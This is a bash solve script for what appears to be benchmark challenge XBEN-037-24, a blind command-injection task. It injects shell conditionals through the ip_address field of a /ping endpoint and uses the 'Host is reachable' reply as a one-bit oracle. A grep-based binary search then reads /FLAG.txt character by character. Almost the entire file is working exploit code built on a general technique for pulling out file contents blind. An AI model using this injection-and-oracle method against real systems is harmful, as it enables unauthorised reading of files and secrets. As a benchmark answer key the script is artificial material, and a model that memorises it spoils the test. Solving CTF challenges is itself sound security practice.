#!/usr/bin/env bash
# XBEN-037-24 — "Is There Anybody Out There? - Blind" (tags: command_injection)
#
# `/ping` concatenates the submitted address into `ping -c 2 <ip>` and runs it
# through a shell. The output is not returned: the page says only "Host is
# reachable!" or "Host is unreachable!".
#
# One bit per request, then. `;ping -c 1 127.0.0.1;#` is the true branch and
# anything else is the false one, so a condition wrapped around that ping turns
# the reachability message into an oracle. Leading `;` matters: it leaves the
# real ping with no argument, so it prints usage and exits at once instead of
# spending a second on the network.
#
# The flag is 64 hex characters between a known prefix and a known suffix, and
# grep character classes binary-search the alphabet, so each character costs 4
# requests rather than 16.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben037-$$"
FILE="${2:-/FLAG.txt}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# Ask the target one yes/no question. Exits 0 for yes.
ask() {
    local seq
    seq="$("$H5I" websec replay req_0 --create --reset-budget \
        --set 'method=POST' --set 'path=/ping' --set "form.ip_address=;if $1;then ping -c 1 127.0.0.1;fi;#" \
        --session "$SESSION" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
    "$H5I" websec match "res_$seq" --contains 'Host is reachable' --session "$SESSION" >/dev/null 2>&1
}

if ! ask "true"; then
    echo "the oracle does not answer: no injection here" >&2
    exit 1
fi

ALPHABET='0123456789abcdef'
flag='FLAG{'
for position in $(seq 6 69); do   # `cut -c` is 1-based, and 'FLAG{' is 5 characters
    low=0
    high=15
    while [ "$low" -lt "$high" ]; do
        middle=$(((low + high) / 2))
        # A grep class covering exactly the low half of what is still possible.
        class="${ALPHABET:low:middle-low+1}"
        if ask "cut -c$position-$position $FILE | grep -q '[$class]'"; then
            high=$middle
        else
            low=$((middle + 1))
        fi
    done
    flag="$flag${ALPHABET:low:1}"
    printf '\r  %s' "$flag" >&2
done
printf '\n' >&2
echo "$flag}"
